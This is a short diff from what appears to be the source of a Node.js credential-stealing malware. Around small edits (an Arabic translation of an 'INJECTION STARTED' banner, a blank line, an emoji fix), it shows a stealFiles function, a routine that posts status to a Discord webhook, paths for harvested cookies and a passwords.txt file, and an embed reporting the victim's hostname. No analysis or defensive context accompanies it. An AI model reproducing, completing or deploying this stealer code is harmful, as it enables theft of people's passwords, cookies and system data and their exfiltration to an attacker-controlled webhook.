@@ -645,7 +645,7 @@ function stealFiles() {
 
 
 function sendSuccessToWebhook() {
-    const successMessage = '**<--------------------------INJECTION STARTED--------------------------->**';
+    const successMessage = '**<--------------------------بدء عمليه الحقن--------------------------->**';
     axios.post(discordWebhookUrl, {
         content: successMessage,
     }).then(response => {
@@ -3026,6 +3026,7 @@ async function getExtension(zipFilePath) {
         }
     }
 
+
     const cookiesFolder = path.join(mainFolderPath, 'cookies');
 
     const passwordsFilePath = path.join(mainFolderPath, 'Passwords', 'passwords.txt');
@@ -3139,7 +3140,7 @@ try {
         description: '‎',
         color: 0x303037,
         author: {
-            name: `${user.hostname} | System Information | @wejust | update (soon <a:fHighRedfire:1175749324790054922> )`,
+            name: `${user.hostname} | System Information | @wejust | update (soon <:fHighRedfire:1175749324790054922> )`,
             icon_url: 'https://media.discordapp.net/attachments/950036231889256479/1292164096665587894/giphy.png?ex=6702bd17&is=67016b97&hm=ee0431cd1f71e1b19efc31e045f762e7bc9e670c7760c1da94bc99ff4c1adf8c&=&format=webp&quality=lossless&width=553&height=553',
         },
         fields: [
